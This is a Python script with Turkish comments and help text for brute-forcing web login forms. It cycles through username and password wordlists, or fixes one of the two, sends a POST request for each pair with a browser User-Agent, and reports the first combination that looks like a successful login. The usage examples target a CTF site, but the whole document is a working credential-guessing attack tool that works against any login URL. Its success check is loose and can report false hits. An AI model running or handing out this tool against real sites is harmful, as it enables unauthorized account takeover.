#!/usr/bin/env python3
"""
HTTP Login Brute Force Tool
Kullanım:
  python3 web_login_brute_force.py <URL> <users_file> <passwords_file> [--username USERNAME] [--password PASSWORD]
Örnekler:
  # Tam brute-force (hem user hem password)
  python3 web_login_brute_force.py http://ctf-site.com/login.php users.txt passwords.txt
  
  # Sadece password brute-force (username sabit)
  python3 web_login_brute_force.py http://ctf-site.com/login.php --username admin passwords.txt
  
  # Sadece username brute-force (password sabit)
  python3 web_login_brute_force.py http://ctf-site.com/login.php users.txt --password P@ssw0rd
"""

import requests
import argparse
import sys
from time import sleep

def load_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] {file_path} dosyası bulunamadı!")
        sys.exit(1)

def brute_force(url, users, passwords, delay=0, retries=1):
    session = requests.Session()
    for attempt in range(retries):
        for user in users:
            for password in passwords:
                data = {
                    "username": user,
                    "password": password,
                    # CSRF token gerekirse buraya eklenmeli
                }
                
                try:
                    response = session.post(
                        url,
                        data=data,
                        timeout=10,
                        allow_redirects=False,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    
                    # Başarı kriteri (response.text, status_code veya redirect'e göre ayarlayın)
                    if (response.status_code == 302 or 
                        "login failed" not in response.text.lower() or
                        "logout" in response.text.lower()):
                        print(f"\n[+] BAŞARILI GİRİŞ! - Kullanıcı: {user} | Şifre: {password}")
                        print(f"[+] Response Code: {response.status_code}")
                        print(f"[+] Response Size: {len(response.text)}")
                        return True
                    
                    print(f"[-] Denenen: {user}:{password} | Code: {response.status_code}", end='\r')
                    
                except requests.exceptions.RequestException as e:
                    print(f"\n[-] Hata: {e}")
                    continue
                
                if delay > 0:
                    sleep(delay)
        
        print(f"\n[!] Deneme {attempt + 1}/{retries} tamamlandı. Sonuç bulunamadı.")
    
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Gelişmiş HTTP Login Brute Force Aracı',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=__doc__
    )
    
    parser.add_argument('url', help='Hedef login URL (örn: http://site.com/login.php)')
    parser.add_argument('users_file', nargs='?', help='Kullanıcı adları listesi (users.txt)')
    parser.add_argument('passwords_file', nargs='?', help='Şifreler listesi (passwords.txt)')
    parser.add_argument('--username', help='Sabit kullanıcı adı (sadece password brute için)')
    parser.add_argument('--password', help='Sabit şifre (sadece username brute için)')
    parser.add_argument('--delay', type=float, default=0.5, help='İstekler arası bekleme süresi (saniye)')
    parser.add_argument('--retries', type=int, default=1, help='Max deneme sayısı (wordlist tekrarı)')
    
    args = parser.parse_args()

    # Kullanıcı/şifre kombinasyonlarını hazırla
    if args.username:
        users = [args.username]
        passwords = load_wordlist(args.passwords_file) if args.passwords_file else []
    elif args.password:
        users = load_wordlist(args.users_file) if args.users_file else []
        passwords = [args.password]
    else:
        users = load_wordlist(args.users_file) if args.users_file else []
        passwords = load_wordlist(args.passwords_file) if args.passwords_file else []

    if not users or not passwords:
        print("[-] Hata: Geçerli kullanıcı/şifre listesi bulunamadı!")
        parser.print_help()
        sys.exit(1)

    print(f"\n[+] Brute Force Başlatılıyor...")
    print(f"[+] Hedef: {args.url}")
    print(f"[+] Kullanıcı Sayısı: {len(users)}")
    print(f"[+] Şifre Sayısı: {len(passwords)}")
    print(f"[+] Toplam Kombinasyon: {len(users) * len(passwords)}")
    print(f"[+] Gecikme: {args.delay}s\n")

    brute_force(
        args.url,
        users,
        passwords,
        delay=args.delay,
        retries=args.retries
    )
